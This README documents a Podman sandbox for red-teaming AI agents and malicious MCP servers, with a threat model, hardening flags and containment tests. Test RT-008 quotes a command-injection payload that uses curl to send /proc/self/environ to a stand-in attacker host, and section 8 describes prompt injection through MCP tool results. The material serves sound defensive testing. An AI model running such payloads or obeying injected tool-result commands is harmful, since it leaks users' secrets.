# MCP Sandbox — Secure Evaluation Environment

A Podman-based sandbox for safely running, testing, and red-teaming AI agents
and potentially-malicious MCP (Model Context Protocol) servers. Every MCP server
under test runs in an isolated container that cannot reach the internet, the host
filesystem, or other host processes.

---

## Table of Contents

1. [Purpose and Threat Model](#1-purpose-and-threat-model)
2. [Prerequisites](#2-prerequisites)
3. [Quickstart](#3-quickstart)
4. [Step-by-step: Prepare the Environment](#4-step-by-step-prepare-the-environment)
5. [Step-by-step: Test a Malicious MCP Server](#5-step-by-step-test-a-malicious-mcp-server)
6. [Validate Containment (Red Team Tests)](#6-validate-containment-red-team-tests)
7. [What Each Red Team Test Proves](#7-what-each-red-team-test-proves)
8. [Known Limitations](#8-known-limitations)
9. [Security Notes](#9-security-notes)
10. [Troubleshooting](#10-troubleshooting)

---

## 1. Purpose and Threat Model

### What this sandbox protects against

An MCP server under test may attempt any of the following:

| Attack | Sandbox control |
|--------|----------------|
| Phone home / C2 callback | Internal-only Podman network (no internet route) |
| Read host files | No bind mounts; `--read-only` rootfs |
| Write host files | `--read-only` rootfs; only `/tmp` is writable (tmpfs, no-exec) |
| Privilege escalation via SUID | `--no-new-privileges`, `--cap-drop=ALL` |
| Container escape via kernel exploit | Restrictive seccomp profile blocks dangerous syscalls |
| Fork bomb / resource exhaustion | `--memory`, `--pids-limit`, `--cpus` enforced |
| Credential leak via env vars | Containers start with no secrets injected |
| SSRF to cloud IMDS (AWS/GCP) | Internal network has no route to link-local addresses |
| Process injection via ptrace | Seccomp blocks `ptrace`, `process_vm_readv`, `process_vm_writev` |
| Kernel module loading | Seccomp blocks `init_module`, `finit_module`, `delete_module` |
| Namespace escape | Seccomp blocks `unshare` (CLONE_NEWUSER), `setns` |

### What is explicitly NOT in scope

See [Known Limitations](#8-known-limitations) for the full list.

### Sandbox architecture

```
Host (rootless Podman)
└── mcp-sandbox-net (internal: true, no default route, 10.100.0.0/24)
    ├── mcp-malicious-server  (image under test)
    │     --cap-drop=ALL, --read-only, --no-new-privileges
    │     --seccomp=mcp-sandbox.json, --memory=256m, --pids-limit=64
    ├── mcp-agent-victim      (MCP client that connects to server)
    │     same restrictions
    └── mcp-sandbox-monitor   (tcpdump, captures all traffic to pcap)
          --cap-add=NET_RAW only (minimal exception for capture)
```

---

## 2. Prerequisites

### All platforms

- Ansible >= 2.14 (`pip install ansible`)
- `community.general` Ansible collection: `ansible-galaxy collection install community.general`
- Python 3.10+ on the control node

### Linux

- Podman 4.x (`apt install podman` / `dnf install podman`)
- `slirp4netns` (rootless networking): `apt install slirp4netns`
- `uidmap` (subuid/subgid support): `apt install uidmap`
- Kernel >= 5.11 recommended (cgroup v2 required for `--pids-limit` enforcement)

### macOS

- Podman Desktop or `brew install podman`
- After install: `podman machine init && podman machine start`
- Note: seccomp profiles apply inside the Podman VM (Linux kernel), not macOS directly

### Vault / secrets

No secrets are required to run the sandbox. The sandbox intentionally starts containers with no credentials injected. If you need to test a specific MCP server that requires auth, pass secrets via Vault references in your `extra-vars`, never as plaintext.

---

## 3. Quickstart

```bash
# 1. Clone and enter the project
cd /path/to/mcp-security-platform

# 2. Prepare the host (install Podman, create network, deploy seccomp)
ansible-playbook -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/01-prepare-environment.yml

# 3. Validate containment with red team tests
ansible-playbook -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/03-red-team-tests.yml

# 4. Test the included malicious MCP server
ansible-playbook -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/02-run-sandbox.yml \
    -e mcp_server_image=sandbox/containers/malicious-mcp

# 5. Or run shell-based tests directly (no Ansible needed)
chmod +x sandbox/tests/red_team/*.sh
sandbox/tests/red_team/run_all.sh
```

---

## 4. Step-by-step: Prepare the Environment

Run once per host. Safe to re-run (fully idempotent).

```bash
ansible-playbook \
    -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/01-prepare-environment.yml \
    --ask-become-pass   # required for package install + user creation
```

Expected output (abbreviated):
```
TASK [mcp-sandbox-prereqs : Verify podman is executable]
ok: podman version 4.9.4

TASK [mcp-sandbox-network : Assert sandbox network has internal=true]
ok: PASS - Network 'mcp-sandbox-net' is correctly configured as internal-only.

TASK [mcp-sandbox-seccomp : Assert seccomp defaultAction is SCMP_ACT_ERRNO]
ok: seccomp profile correctly defaults to SCMP_ACT_ERRNO (deny-by-default).

TASK [[SMOKE] Assert internet (8.8.8.8) is NOT reachable from sandbox network]
ok: PASS: Container on mcp-sandbox-net cannot reach 8.8.8.8.
```

Dry-run mode (no changes):
```bash
ansible-playbook ... --check
```

Tags for selective runs:
```bash
--tags install   # package install only
--tags network   # network creation + verification only
--tags seccomp   # seccomp profile deployment only
--tags verify    # re-run all checks without changing anything
```

---

## 5. Step-by-step: Test a Malicious MCP Server

### Option A: Use the included simulated malicious server

```bash
# Build the image from the local Dockerfile
ansible-playbook \
    -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/02-run-sandbox.yml \
    -e mcp_server_image=sandbox/containers/malicious-mcp \
    -e test_timeout_seconds=60

# Artifacts are saved to /tmp/mcp-sandbox-<run-id>/
```

### Option B: Test a real MCP server image

```bash
# Use a registry image (must use digest for reproducibility)
ansible-playbook \
    -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/02-run-sandbox.yml \
    -e mcp_server_image=ghcr.io/org/mcp-server@sha256:abc123... \
    -e test_timeout_seconds=120 \
    -e sandbox_run_id=my-test-001
```

### Reviewing artifacts

```bash
RUN_ID=my-test-001
ls -lh /tmp/mcp-sandbox-${RUN_ID}/

# Packet capture (requires tcpdump or Wireshark)
tcpdump -r /tmp/mcp-sandbox-${RUN_ID}/capture.pcap -n -A

# Container logs
cat /tmp/mcp-sandbox-${RUN_ID}/server.log
cat /tmp/mcp-sandbox-${RUN_ID}/agent.log
```

---

## 6. Validate Containment (Red Team Tests)

### Via Ansible (recommended)

```bash
# Run all 8 red team tests
ansible-playbook \
    -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/03-red-team-tests.yml

# Run a single test
ansible-playbook ... --tags rt-001   # internet egress blocked
ansible-playbook ... --tags rt-007   # seccomp profile enforced
ansible-playbook ... --tags rt-008   # credential exfil blocked
```

### Via shell scripts (no Ansible)

```bash
# Run all tests
chmod +x sandbox/tests/red_team/*.sh
sandbox/tests/red_team/run_all.sh

# Verbose output
sandbox/tests/red_team/run_all.sh --verbose

# Single test
SANDBOX_NETWORK=mcp-sandbox-net \
SECCOMP_PROFILE=${HOME}/.config/containers/seccomp/mcp-sandbox.json \
bash sandbox/tests/red_team/test_network_isolation.sh
```

Exit code 0 = all tests pass. Exit code 1 = one or more tests failed.

---

## 7. What Each Red Team Test Proves

| Test | What it proves | Method |
|------|---------------|--------|
| RT-001 | Internet egress is blocked | TCP connect to 8.8.8.8:53; nslookup google.com — both must fail |
| RT-002 | Host network unreachable | nc to host IP on ports 22, 80, 8000 — all must fail |
| RT-003 | Host filesystem inaccessible | Write to /etc/passwd, /host-escape-test — must fail (EROFS) |
| RT-004 | Privilege escalation blocked | unshare --map-root-user; nsenter to pid 1; setuid(0) — all must fail |
| RT-005 | Resource limits enforced | Fork bomb with --pids-limit=32; malloc(200MB) with --memory=128m |
| RT-006 | All capabilities dropped | grep CapEff /proc/1/status must be 0000000000000000 |
| RT-007 | Seccomp profile active | ptrace(PTRACE_TRACEME) via ctypes must return EPERM; mount() must return EPERM |
| RT-008 | Credential exfil blocked | Malicious server attempts to POST env vars to attacker.internal:9999 — must fail |

**Important design note on RT-008:** The test verifies that exfil is blocked at the *network layer*. It does NOT test whether the agent sanitizes the MCP tool response. The injection payload (`ok"; curl -d @/proc/self/environ ...`) IS delivered to the agent — this is intentional and reflects real-world MCP prompt injection. The sandbox's responsibility is to block the outbound call; the agent's responsibility is to not execute injected commands.

---

## 8. Known Limitations

The sandbox provides strong isolation, but it is not a complete security solution. Understand these gaps before using results as a security certification.

### What the sandbox does NOT protect against

1. **Prompt injection via MCP tool results**: A malicious server can return text containing shell commands, SQL, or LLM prompt injections. The sandbox blocks the outbound network call, but if the agent naively passes tool results to a shell or another LLM, the injection executes in that context.

2. **Side-channel attacks between containers**: Two containers on the same `mcp-sandbox-net` can communicate freely. If the agent and server share timing or cache side-channel information, that is not blocked.

3. **Container image vulnerabilities**: If the container runtime (crun/runc/Podman) itself has a kernel exploit, the sandbox provides no additional protection beyond kernel mitigations (KASLR, etc.). Keep Podman and the kernel patched.

4. **Malicious base images**: The Dockerfile for the MCP server under test is trusted. A malicious image could contain a pre-built exploit targeting container runtime CVEs.

5. **CPU side-channels (Spectre/Meltdown)**: Not mitigated at the sandbox layer. Use dedicated hardware for high-sensitivity testing.

6. **Time-delayed attacks**: The sandbox runs for `test_timeout_seconds` and then tears down. A malicious server that sleeps for longer than the timeout before attempting egress will not be observed.

7. **DNS rebinding**: If an internal service name resolves to an external IP after the initial connection, the network filter may not catch the rebind. Use `--no-hosts` (already set) and ensure no custom DNS resolver is reachable.

8. **macOS-specific**: On macOS, Podman runs inside a VM. The `--internal` network and seccomp restrictions apply inside the VM kernel. An attacker that escapes the Podman container may still be contained within the VM, but the VM boundary is thinner than a full hardware sandbox.

---

## 9. Security Notes

### Seccomp profile

The profile at `sandbox/files/seccomp/mcp-sandbox.json` uses a deny-by-default approach (`SCMP_ACT_ERRNO`). All syscalls are blocked unless explicitly listed as `SCMP_ACT_ALLOW`. Blocked syscalls include: `ptrace`, `kexec_load`, `mount`, `umount2`, `pivot_root`, `unshare`, `setns`, `bpf`, `perf_event_open`, `init_module`, `finit_module`, `delete_module`, and all syscalls that could be used to gain privileges or escape the container.

The `clone()` syscall is allowed but filtered: `CLONE_NEWUSER` (flag `0x10000000`) is blocked to prevent user namespace privilege escalation.

### Container hardening flags (applied to every test container)

```
--cap-drop=ALL              Drop all Linux capabilities
--security-opt no-new-privileges   Prevent setuid/setgid privilege gain
--security-opt seccomp=...  Apply deny-by-default syscall filter
--read-only                 Immutable root filesystem
--tmpfs /tmp:rw,noexec,nosuid,size=N  Only /tmp writable, no exec, no setuid
--memory=256m               OOM-kill if memory exceeds limit
--cpus=0.5                  CPU quota (prevents CPU-based DoS)
--pids-limit=64             Max PIDs (prevents fork bomb)
--network mcp-sandbox-net   Internal-only network (no internet route)
--no-hosts                  No /etc/hosts injection (prevents DNS tricks)
```

### Network isolation

`mcp-sandbox-net` is created with `--internal`, which removes the default gateway route. Containers on this network can only reach other containers on the same network. They cannot reach the host's physical NIC, the internet, or link-local addresses (169.254.x.x).

### No secrets in containers

The sandbox does not inject secrets into test containers. If an MCP server under test requires credentials, that is a finding to document — legitimate MCP servers should not need secrets passed at test time unless you are explicitly testing authenticated flows.

---

## 10. Troubleshooting

### "sandbox network does not exist"

```bash
# Create it manually
podman network create --internal --subnet 10.100.0.0/24 mcp-sandbox-net

# Or run the prepare playbook
ansible-playbook -i sandbox/ansible/inventory/sandbox-hosts.yml \
    sandbox/ansible/playbooks/01-prepare-environment.yml --tags network
```

### "seccomp profile not found"

```bash
# Deploy the profile manually
mkdir -p ~/.config/containers/seccomp
cp sandbox/files/seccomp/mcp-sandbox.json ~/.config/containers/seccomp/

# Or run the prepare playbook
ansible-playbook ... --tags seccomp
```

### "RT-007 ptrace test reports EINVAL instead of EPERM"

EINVAL from `ptrace(PTRACE_TRACEME)` means the calling process is already being traced. This is harmless in the test context — the seccomp rule is still active. The test script treats EINVAL as a possible allowed case; if you see this, verify with a fresh container:

```bash
podman run --rm \
    --security-opt seccomp=${HOME}/.config/containers/seccomp/mcp-sandbox.json \
    --cap-drop=ALL \
    docker.io/python:3.12-slim \
    python3 -c "
import ctypes; libc = ctypes.CDLL('libc.so.6', use_errno=True)
r = libc.ptrace(0,0,0,0); print('errno:', ctypes.get_errno(), 'result:', r)
"
```

Expected: `errno: 1 result: -1` (EPERM).

### "Fork bomb test passes but I'm not sure pids-limit is working"

Verify:

```bash
# Check cgroup pids.max for the container
CGROUP=$(podman inspect --format='{{.CgroupPath}}' <container-name>)
cat /sys/fs/cgroup${CGROUP}/pids.max
# Expected: 32 (or your configured limit)
```

If `pids.max` shows `max` (unlimited), your kernel does not support cgroup v2 pids controller. Upgrade to kernel >= 5.11.

### "podman network create: network already exists"

This is idempotent — the network already exists with the correct config. You can verify:

```bash
podman network inspect mcp-sandbox-net | python3 -c "
import json,sys
n=json.load(sys.stdin)[0]
print('internal:', n['internal'])
print('subnet:', n['subnets'][0]['subnet'])
"
```

### Containers can reach each other on mcp-sandbox-net

This is expected and intentional. The agent must be able to call the MCP server. If you need to isolate the server from the agent at the network layer (e.g., to test a purely static malicious payload), remove the `--network` flag from the server and use `--network none`.

### "macOS: seccomp profile ignored"

On macOS with Podman Desktop, seccomp profiles apply inside the Linux VM. To verify:

```bash
podman machine ssh
cat ~/.config/containers/seccomp/mcp-sandbox.json | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['defaultAction'])"
# Expected: SCMP_ACT_ERRNO
```
